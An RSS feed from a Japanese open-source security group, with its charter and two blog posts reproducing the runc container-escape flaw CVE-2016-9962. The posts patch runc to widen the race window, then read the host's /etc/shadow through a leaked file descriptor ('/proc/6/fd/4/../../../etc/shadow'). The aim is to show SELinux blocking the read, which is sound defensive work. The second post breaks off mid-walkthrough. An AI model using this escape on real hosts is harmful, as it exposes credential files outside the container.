<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Secure OSS SIG</title>
    <link>https://jsoss-sig.github.io/index.xml</link>
    <description>Recent content on Secure OSS SIG</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>ja-JP</language>
    <copyright>SOSS SIG all rights reserved. 2016</copyright>
    <lastBuildDate>Fri, 03 Feb 2017 10:00:00 +0900</lastBuildDate>
    <atom:link href="https://jsoss-sig.github.io/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>About SOSS SIG</title>
      <link>https://jsoss-sig.github.io/about/</link>
      <pubDate>Fri, 03 Feb 2017 10:00:00 +0900</pubDate>
      
      <guid>https://jsoss-sig.github.io/about/</guid>
      <description>

&lt;h1 id=&#34;ｏｓｓセキュリティ技術の会趣意書-ver-1-0-2016-12-15&#34;&gt;ＯＳＳセキュリティ技術の会趣意書 ver 1.0 2016/12/15　&lt;/h1&gt;

&lt;h2 id=&#34;１-ｏｓｓセキュリティ技術の会とは&#34;&gt;１．ＯＳＳセキュリティ技術の会とは&lt;/h2&gt;

&lt;p&gt;　ＯＳＳセキュリティ技術の発展は目覚ましいものがあります。例えば、トラステッドＯＳと呼ばれていた軍用技術が今やLinuxに標準で取り込まれています。しかし、これらの技術は主に米国等海外で開発されており、日本語での情報が乏しく日本ではＯＳＳセキュリティ技術は十分に活用されていません。「ＯＳＳセキュリティ技術の会（英文名：Secure OSS SIG）」は、グローバルコミュニティで開発されるＯＳＳのセキュリティ技術の普及促進・技術者の交流促進を目的に設立されました。本会では、SELinux等のプラットフォームセキュリティ技術を中心として、勉強会の開催・Webでの情報発信などを行います。&lt;/p&gt;

&lt;h2 id=&#34;２-組織&#34;&gt;２．組織&lt;/h2&gt;

&lt;h3 id=&#34;２-１-会への参加&#34;&gt;２．１　会への参加&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;本会への参加は特別に制限を設けません。ただし、技術的な議論に関係ない迷惑行為（スパム等）や反社会的勢力との繋がりが明白な場合は当会主催のメーリングリスト等から除外することがあります。&lt;/li&gt;
&lt;li&gt;企業等の団体は、運営委員会による合意の下、団体として参加し会の運営に協力することもできます。参加費は無料です。謝意を示すため参加・協力頂いた団体名を会のホームページに掲載しますが、反社会的団体であることは判明した場合は速やかに掲載を削除します。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;２-２-運営委員会&#34;&gt;２．２　運営委員会&lt;/h3&gt;

&lt;p&gt;本会は、有志により構成される運営委員会によって運営されます。運営委員会は、イベントの企画・実行、会のWebサイト・ソーシャルメディアのコンテンツの企画・管理など会の運営を行います。また、会の名誉を毀損する行為があった場合、運営委員会メンバの過半数の賛成により除名できるものとします。ただし、運営委員の反社会的行為が明白になった場合は、当該委員は速やかに除名されるものとします。&lt;/p&gt;

&lt;h2 id=&#34;３-活動内容&#34;&gt;３．活動内容&lt;/h2&gt;

&lt;h3 id=&#34;３-１-webサイトでの情報発信&#34;&gt;３．１　Webサイトでの情報発信&lt;/h3&gt;

&lt;p&gt;ＯＳＳセキュリティ技術の会は、連絡事項や技術的に有益な情報を本会ホームページおよびソーシャルメディアを通じて発信します。
当会のホームページは以下のＵＲＬで参照できます。
&lt;a href=&#34;http://www.secureoss.jp/&#34;&gt;http://www.secureoss.jp/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;３-２-メーリングリストの開催&#34;&gt;３．２　メーリングリストの開催&lt;/h3&gt;

&lt;p&gt;　連絡事項および技術的な議論のために、メーリングリストを提供します。&lt;/p&gt;

&lt;h3 id=&#34;３-３-勉強会の開催&#34;&gt;３．３　勉強会の開催&lt;/h3&gt;

&lt;p&gt;　本会では、年2回程度を目標に、技術的な情報交換を目的とした勉強会を開催します。開催日程については、ホームページやメーリングリスト等で告知します。&lt;/p&gt;

&lt;p&gt;以上&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Docker vulnerability (CVE-2016-9962) PoC with SELinux (Again)</title>
      <link>https://jsoss-sig.github.io/post/omok-selinux-docker-20170123/</link>
      <pubDate>Mon, 23 Jan 2017 13:07:34 +0900</pubDate>
      
      <guid>https://jsoss-sig.github.io/post/omok-selinux-docker-20170123/</guid>
      <description>

&lt;p&gt;This blog is for following up to reproduce CVE-2016-9962(vulnerability for
Docker) and how can we mitigate it by using SELinux.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;reference&#34;&gt;Reference&lt;/h2&gt;

&lt;h4 id=&#34;docker-vulnerability-cve-2016-9962-poc-with&#34;&gt;[Docker vulnerability (CVE-2016-9962) PoC with&lt;/h4&gt;

&lt;p&gt;SELinux](&lt;a href=&#34;https://jsoss-sig.github.io/post/omok-selinux-docker-20170118/&#34;&gt;https://jsoss-sig.github.io/post/omok-selinux-docker-20170118/&lt;/a&gt;)&lt;/p&gt;

&lt;h4 id=&#34;https-bugzilla-redhat-com-show-bug-cgi-id-1409531&#34;&gt;&lt;a href=&#34;https://bugzilla.redhat.com/show_bug.cgi?id=1409531&#34;&gt;https://bugzilla.redhat.com/show_bug.cgi?id=1409531&lt;/a&gt;&lt;/h4&gt;

&lt;h4 id=&#34;https-bugzilla-suse-com-show-bug-cgi-id-1012568-c2&#34;&gt;&lt;a href=&#34;https://bugzilla.suse.com/show_bug.cgi?id=1012568#c2&#34;&gt;https://bugzilla.suse.com/show_bug.cgi?id=1012568#c2&lt;/a&gt;&lt;/h4&gt;

&lt;h2 id=&#34;mistake-in-previous-poc&#34;&gt;Mistake in Previous PoC&lt;/h2&gt;

&lt;p&gt;I sent previous PoC result to SELinux , I got result I did mistake in Previous
PoC. &lt;strong&gt;Actually, I didn&amp;rsquo;t use SELinux Access Control in Previous PoC&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In Previous PoC, &amp;ldquo;[PoC] run container(sh) in shell1;&amp;rdquo;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# runc run ctr

/ #
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But Finally I found the &amp;ldquo;runc&amp;rdquo; program is working in &amp;ldquo;unconfined_t&amp;rdquo; domain.
From another terminal, I checked runc domain;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@fedora25 ~]# ps axZ|grep runc
unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 1578 pts/0 Sl+
0:00 runc run ctr
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So this means runc is working in unconfined_t domain, then that runc is having
lots of permissions(actually un-confined) from SELinux.&lt;/p&gt;

&lt;p&gt;This is a reason why SELinux couldn&amp;rsquo;t mitigate my previous PoC.&lt;/p&gt;

&lt;h2 id=&#34;assign-container-t-domain-on-runc&#34;&gt;Assign &amp;ldquo;container_t&amp;rdquo; domain on runc.&lt;/h2&gt;

&lt;p&gt;When I checked Fedora25 SELinux Policy, I found that container_t domain is
switched from container_runtime_t(which is domain for docker process, etc.).
And container_runtime_t is transited from initrc domain by exec
container_runtime_exec_t file(/usr/bin/runc), such as;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@fedora25 ~]# ls -lZ /usr/bin/runc
-rwxr-xr-x. 1 root root system_u:object_r:container_runtime_exec_t:s0 5016704 Jan 20 19:26 /usr/bin/runc



./container.cil:(typetransition initrc_domain container_runtime_exec_t process c
ontainer_runtime_t)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then, for doing PoC more close to existance situation, we need to run &amp;ldquo;runc&amp;rdquo;
as &amp;ldquo;container_t&amp;rdquo; domain.&lt;/p&gt;

&lt;p&gt;For running &amp;ldquo;runc&amp;rdquo; as &amp;ldquo;container_t&amp;rdquo; domain, we need to add several policy
(typetransition rule and more allow rule) to transit from unconfined_t to
container_t domain. Also I changed PoC directory from /root to /tmp.&lt;/p&gt;

&lt;h2 id=&#34;changed-poc-directory&#34;&gt;Changed PoC directory.&lt;/h2&gt;

&lt;p&gt;For more easy to write Policy for this PoC, I changed PoC directory to /tmp
/PoC-CVE-2016-9962;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@fedora25 PoC-CVE-2016-9962]# pwd
/tmp/PoC-CVE-2016-9962
[root@fedora25 PoC-CVE-2016-9962]# ls -l
total 4
-rw-r--r--.  1 root root 2364 Jan 20 09:04 config.json
drwxr-xr-x. 18 root root  380 Jan 23 12:33 rootfs
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;additional-policy&#34;&gt;Additional Policy&lt;/h2&gt;

&lt;p&gt;Just for PoC, I made below policy rule file as &amp;ldquo;/root/custom_policy/runc.cil&amp;rdquo;;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(typetransition unconfined_usertype container_runtime_exec_t process container_t
)
(roletransition unconfined_r container_runtime_exec_t process system_r)

(allow container_t user_tmp_t (file (open read execute execute_no_trans)))
(allow container_t var_run_t (dir (write add_name create setattr remove_name rmd
ir)))
(allow container_t var_run_t (fifo_file (create setattr unlink read open)))
(allow container_t ptmx_t (chr_file (read write open ioctl)))
(allow container_t devpts_t (chr_file (setattr read write open ioctl getattr)))
(allow container_t root_t (dir (mounton)))
(allow container_t user_tmp_t (dir (mounton write add_name create remove_name rm
dir)))
(allow container_t user_tmp_t (lnk_file (read)))
(allow container_t proc_t (filesystem (mount remount)))
(allow container_t tmpfs_t (filesystem (mount remount)))
(allow container_t tmpfs_t (dir (setattr write add_name create mounton)))
(allow container_t devpts_t (filesystem (mount)))
(allow container_t sysfs_t (filesystem (mount)))
(allow container_t cgroup_t (filesystem (remount)))
(allow container_t tmpfs_t (lnk_file (create)))
(allow container_t tmpfs_t (chr_file (create setattr read write open getattr ioc
tl append)))
(allow container_t tmpfs_t (file (open create mounton)))
(allow container_t proc_t (dir (mounton)))
(allow container_t proc_t (file (mounton)))
(allow container_t sysctl_irq_t (dir (mounton)))
(allow container_t sysctl_t (dir (mounton)))
(allow container_t sysctl_t (file (mounton)))
(allow container_t proc_kcore_t (file (mounton)))
(allow container_t nsfs_t (file (getattr read open)))
(allow container_t var_run_t (file (create read write open unlink)))
(allow container_t sysfs_t (dir (mounton)))
(allow container_t kernel_t (unix_stream_socket (read write)))
(allow init_t kernel_t (unix_stream_socket (read write)))
(allow container_t init_t (unix_stream_socket (read write)))
[root@fedora25 custom_policy]# cat runc.cil
(typetransition unconfined_usertype container_runtime_exec_t process container_t)
(roletransition unconfined_r container_runtime_exec_t process system_r)

(allow container_t user_tmp_t (file (open read execute execute_no_trans)))
(allow container_t var_run_t (dir (write add_name create setattr remove_name rmdir)))
(allow container_t var_run_t (fifo_file (create setattr unlink read open)))
(allow container_t ptmx_t (chr_file (read write open ioctl)))
(allow container_t devpts_t (chr_file (setattr read write open ioctl getattr)))
(allow container_t root_t (dir (mounton)))
(allow container_t user_tmp_t (dir (mounton write add_name create remove_name rmdir)))
(allow container_t user_tmp_t (lnk_file (read)))
(allow container_t proc_t (filesystem (mount remount)))
(allow container_t tmpfs_t (filesystem (mount remount)))
(allow container_t tmpfs_t (dir (setattr write add_name create mounton)))
(allow container_t devpts_t (filesystem (mount)))
(allow container_t sysfs_t (filesystem (mount)))
(allow container_t cgroup_t (filesystem (remount)))
(allow container_t tmpfs_t (lnk_file (create)))
(allow container_t tmpfs_t (chr_file (create setattr read write open getattr ioctl append)))
(allow container_t tmpfs_t (file (open create mounton)))
(allow container_t proc_t (dir (mounton)))
(allow container_t proc_t (file (mounton)))
(allow container_t sysctl_irq_t (dir (mounton)))
(allow container_t sysctl_t (dir (mounton)))
(allow container_t sysctl_t (file (mounton)))
(allow container_t proc_kcore_t (file (mounton)))
(allow container_t nsfs_t (file (getattr read open)))
(allow container_t var_run_t (file (create read write open unlink)))
(allow container_t sysfs_t (dir (mounton)))
(allow container_t kernel_t (unix_stream_socket (read write)))
(allow init_t kernel_t (unix_stream_socket (read write)))
(allow container_t init_t (unix_stream_socket (read write)))
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;load-additional-policy-to-poc-system&#34;&gt;Load Additional Policy to PoC system&lt;/h2&gt;

&lt;p&gt;On the PoC system&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@fedora25 ~]# semodule -i /root/custom_policy/runc.cil
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;check-custom-policy-is-working-or-not&#34;&gt;Check custom policy is working or not.&lt;/h2&gt;

&lt;p&gt;After load runc.cil, run &amp;ldquo;runc run ctr&amp;rdquo; in a terminal;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@fedora25 PoC-CVE-2016-9962]# runc run ctr
/ #
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then open another terminal and check this &amp;ldquo;runc&amp;rdquo; program is working as
&amp;ldquo;container_t&amp;rdquo; domain;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@fedora25 ~]# ps axZ|grep runc
unconfined_u:system_r:container_t:s0-s0:c0.c1023 6799 pts/1 Sl+   0:00 runc run ctr
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If the &amp;ldquo;runc&amp;rdquo; is not working on container_t domain, chack
/var/log/audit/audit.log and maybe add several another rules to runc.cil.&lt;/p&gt;

&lt;h2 id=&#34;poc-again&#34;&gt;PoC(Again!)&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;open 2 terminals(shell1, shell2).&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Check SELinux is enabled;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# getenforce
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Enforcing&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;run container(sh) in shell1;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# runc run ctr
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;/ #&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;run new container in shell2 with &amp;ldquo;runc exec&amp;rdquo; command. It is pausing 500sec;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# runc run ctr
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;run &amp;ldquo;ps ax&amp;rdquo; in shell1. You can see shell2 process;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# runc run ctr
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;/ # ps ax
PID   USER     TIME   COMMAND
    1 root       0:00 sh
    6 root       0:00 /proc/self/exe init
   11 root       0:00 ps ax
/ #&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;In above case, check /proc/6/fd by ls command. You see path as fd/4;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;/ # ls -la /proc/6/fd/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;total 0
dr-x&amp;mdash;&amp;mdash;    2 root     root             0 Jan 16 06:43 .
dr-xr-xr-x    9 root     root             0 Jan 16 06:43 ..
lrwx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 0 -&amp;gt; /dev/pts/4
lrwx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 1 -&amp;gt; /dev/pts/4
lrwx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 2 -&amp;gt; /dev/pts/4
lrwx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 3 -&amp;gt; socket:[40487]
lr-x&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 4 -&amp;gt; /run/runc/ctr
lrwx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 5 -&amp;gt; /dev/pts/4
lr-x&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 6 -&amp;gt; pipe:[40496]
l-wx&amp;mdash;&amp;mdash;    1 root     root            64 Jan 16 06:43 7 -&amp;gt; /dev/null
/ #&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Do ls /etc/shadow file by using &amp;ldquo;/proc/6/fd/4/../../../etc/shadow&amp;rdquo; path;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;/ # ls -l /proc/6/fd/4/../../../etc/shadow
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ls: /proc/6/fd/4/../../../etc/shadow: Permission denied&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Check /var/log/audit/audit.log;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    type=AVC msg=audit(1485143271.659:3107): avc:  denied  { getattr } for  pid=8847 comm=&amp;quot;ls&amp;quot; path=&amp;quot;/etc/shadow&amp;quot; dev=&amp;quot;dm-0&amp;quot; ino=785423 scontext=unconfined_u:system_r:container_t:s0-s0:c0.c1023 tcontext=system_u:object_r:shadow_t:s0 tclass=file permissive=0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Fine, Now SELinux is protecting to search /etc/shadow file.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Also you can&amp;rsquo;t read /etc/shadow file because the file permission is &amp;ldquo;000&amp;rdquo;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;/ # cat /proc/6/fd/4/../../../etc/shadow
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;cat: can&amp;rsquo;t open &amp;lsquo;/proc/6/fd/4/../../../etc/shadow&amp;rsquo;: Permission denied&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If I change /etc/shadow file as &amp;ldquo;755&amp;rdquo; permission, the DAC control will permit
to read the file.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    [root@fedora25 ~]# chmod 755 /etc/shadow
[root@fedora25 ~]# ls -lh /etc/shadow
-rwxr-xr-x. 1 root root 1.3K Jan 20 08:30 /etc/shadow
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But still I can&amp;rsquo;t read /etc/shadow file ;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    / # cat /proc/6/fd/4/../../../etc/shadow
cat: can&#39;t open &#39;/proc/6/fd/4/../../../etc/shadow&#39;: Permission denied
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I could see in the /var/log/audit/audit.log file that the&amp;rdquo;read&amp;rdquo; action is
denied by SELinux;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    type=AVC msg=audit(1485143502.183:3311): avc:  denied  { read } for  pid=9418 comm=&amp;quot;cat&amp;quot; name=&amp;quot;shadow&amp;quot; dev=&amp;quot;dm-0&amp;quot; ino=785423 scontext=unconfined_u:system_r:container_t:s0-s0:c0.c1023 tcontext=system_u:object_r:shadow_t:s0 tclass=file permissive=0
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Now we know from PoC that we could mitigate CVE-2016-9962 by enabling SELinux.&lt;/p&gt;

&lt;p&gt;So we should enable SELinux in container environment also and making more
safety(and keeping to have mitigate way even if in 0-day situation)
environment.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Docker vulnerability (CVE-2016-9962) PoC with SELinux</title>
      <link>https://jsoss-sig.github.io/post/omok-selinux-docker-20170118/</link>
      <pubDate>Tue, 17 Jan 2017 03:27:40 +0900</pubDate>
      
      <guid>https://jsoss-sig.github.io/post/omok-selinux-docker-20170118/</guid>
      <description>

&lt;p&gt;Here we described how to reproduce CVE-2016-9962(vulnerability for Docker) and
how can we protect it by using SELinux.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;reference&#34;&gt;Reference&lt;/h2&gt;

&lt;h4 id=&#34;https-bugzilla-redhat-com-show-bug-cgi-id-1409531&#34;&gt;&lt;a href=&#34;https://bugzilla.redhat.com/show_bug.cgi?id=1409531&#34;&gt;https://bugzilla.redhat.com/show_bug.cgi?id=1409531&lt;/a&gt;&lt;/h4&gt;

&lt;h4 id=&#34;https-bugzilla-suse-com-show-bug-cgi-id-1012568-c2&#34;&gt;&lt;a href=&#34;https://bugzilla.suse.com/show_bug.cgi?id=1012568#c2&#34;&gt;https://bugzilla.suse.com/show_bug.cgi?id=1012568#c2&lt;/a&gt;&lt;/h4&gt;

&lt;h2 id=&#34;prepare-for-poc&#34;&gt;Prepare for PoC&lt;/h2&gt;

&lt;p&gt;Here is a description how to reproduce it. &lt;strong&gt;I used Fedora25 for this PoC.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This vulnerability is quite hard to reproduce because there&amp;rsquo;s not so much race
window on runc. Also, we need to add &amp;ldquo;CAP_SYS_PTRACE&amp;rdquo; to container for
checking other container&amp;rsquo;s status.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Install docker, runc on your PC.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# rpm -qa|grep -i docker
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;golang-github-fsouza-go-dockerclient-devel-0.2.1-17.git2350d7b.fc25.noarch
golang-github-docker-go-unit-test-devel-1.5.1-0.3.gitd30aec9.fc25.x86_64
golang-github-docker-go-devel-1.5.1-0.3.gitd30aec9.fc25.noarch
docker-devel-1.12.6-3.git51ef5a8.fc25.noarch
golang-github-docker-libcontainer-devel-2.1.1-0.8.gitc964368.fc25.noarch
docker-1.12.6-4.gitf499e8b.fc25.x86_64
golang-github-docker-libcontainer-2.1.1-0.8.gitc964368.fc25.x86_64
golang-github-docker-go-connections-devel-0.1.2-0.2.git6e4c13d.fc25.noarch
docker-common-1.12.6-4.gitf499e8b.fc25.x86_64
golang-github-docker-go-connections-unit-test-devel-0.1.2-0.2.git6e4c13d.fc2
5.x86_64
golang-github-docker-go-units-devel-0.2.0-3.fc25.noarch
[root@localhost ~]# rpm -qa|grep -i runc
runc-1.0.0-3.rc2.gitc91b5be.fc25.x86_64
runc-devel-0.1.1-4.git57b9972.fc25.noarch&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Start docker.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# systemctl start docker
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Use &amp;ldquo;alpine&amp;rdquo; image for PoC.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# docker pull alpine
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;create alpine image (named &amp;ldquo;alpine&amp;rdquo;)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# docker create alpine --name alpine
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;check new alpine container name by using &amp;ldquo;docker ps -a&amp;rdquo;. In below situation
, &amp;ldquo;small_lumiere&amp;rdquo; is the name.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# docker ps -a
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;[root@localhost ~]# docker ps -a
CONTAINER ID        IMAGE               COMMAND             CREATED&lt;br /&gt;
STATUS              PORTS               NAMES
965456106c88        alpine              &amp;ldquo;&amp;ndash;name alpine&amp;rdquo;     6 hours ago&lt;br /&gt;
Created                                 small_lumiere&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;create &amp;ldquo;rootfs&amp;rdquo; directory and copy all of alpine file under rootfs/&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# mkdir rootfs
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;[root@localhost ~]# docker export small_lumiere |tar xvfC - rootfs&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;create config.json&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# runc spec
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;modify config.json for assign CAP_SYS_PTRACE capability.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;                &amp;quot;capabilities&amp;quot;: [
                    &amp;quot;CAP_AUDIT_WRITE&amp;quot;,
                    &amp;quot;CAP_KILL&amp;quot;,
                    &amp;quot;CAP_SYS_PTRACE&amp;quot;,
                    &amp;quot;CAP_NET_BIND_SERVICE&amp;quot;
            ],
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;For PoC, we will modify runc source. Get/install runc SRPM and modify sourc
e code.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# rpm -ivh /tmp/runc-1.0.0-3.rc2.gitc91b5be.fc25.src.r
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;pm
[root@localhost ~]# cd SOURCES/
[root@localhost ~]# ls
runc-c91b5be.tar.gz
[root@localhost ~]#
[root@localhost ~]# mkdir ../work
[root@localhost ~]# cd ../work/
[root@localhost ~]# tar -xvzf ../SOURCES/runc-c91b5be.tar.gz
[root@localhost ~]# cd runc-c91b5bea4830a57eac7882d7455d59518cdf70ec/
[root@localhost runc-c91b5bea4830a57eac7882d7455d59518cdf70ec]# ls
CONTRIBUTING.md       VERSION        main.go              script
Dockerfile            checkpoint.go  main_solaris.go      signals.go
Godeps                contrib        main_unix.go         spec.go
LICENSE               create.go      main_unsupported.go  start.go
MAINTAINERS           delete.go      man                  state.go
MAINTAINERS_GUIDE.md  events.go      pause.go             tests
Makefile              exec.go        ps.go                tty.go
NOTICE                kill.go        restore.go           update.go
PRINCIPLES.md         libcontainer   rlimit_linux.go      utils.go
README.md             list.go        run.go               utils_linux.go
[root@localhost runc-c91b5bea4830a57eac7882d7455d59518cdf70ec]# vi libcontai
ner/setns_init_linux.go&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;We add 2 lines ;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost libcontainer]# diff -Nru setns_init_linux.go setns_init_
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;linux.go.org
&amp;mdash; setns_init_linux.go 2017-01-16 15:26:01.067477093 +0900
+++ setns_init_linux.go.org 2017-01-16 15:25:22.921553094 +0900
@@ -5,6 +5,7 @@
 import (
    &amp;ldquo;fmt&amp;rdquo;
    &amp;ldquo;os&amp;rdquo;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&amp;ldquo;time&amp;rdquo;&lt;/p&gt;

&lt;p&gt;&amp;ldquo;github.com/opencontainers/runc/libcontainer/apparmor&amp;rdquo;
&amp;ldquo;github.com/opencontainers/runc/libcontainer/keys&amp;rdquo;
@@ -49,5 +50,6 @@
if err := label.SetProcessLabel(l.config.ProcessLabel); err != nil {
    return err
}&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;time.Sleep(500 * time.Second)
return system.Execv(l.config.Args[0], l.config.Args[0:], os.Environ())
}&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;make tar.gz and re-create runc package by using rpmbuild.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost work]# tar -cvfrunc-c91b5be.tar runc-c91b5bea4830a57eac7
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;882d7455d59518cdf70ec
[root@localhost work]# gzip runc-c91b5be.tar
[root@localhost work]# cp runc-c91b5be.tar.gz ../SOURCES
[root@localhost work]# cd ../SPECS/
[root@localhost SPECS]# rpmbuild -ba runc.spec
[root@localhost SPECS]# cd ~&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;uninstall and re-install modified runc package;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# rpm -e runc
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;[root@localhost ~]# rpm -ivh rpmbuild/RPMS/x86_64/runc-1.0.0-3.rc2.gitc91b5b
e.fc25.x86_64.rpm&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;poc&#34;&gt;PoC&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;open 2 terminals(shell1, shell2).&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Check SELinux is enabled;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# getenforce
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Enforcing&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;run container(sh) in shell1;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# runc run ctr
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;/ #&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;run new container in shell2 with &amp;ldquo;runc exec&amp;rdquo; command. It is pausing 500sec;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# runc run ctr
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;run &amp;ldquo;ps ax&amp;rdquo; in shell1. You can see shell2 process;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# runc run ctr
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;/ # ps ax
PID   USER     TIME   COMMAND
    1 root       0:00 sh
    6 root       0:00 /proc/self/exe init
   11 root       0:00 ps ax
/ #&lt;/p&gt;&lt;/li&gt;

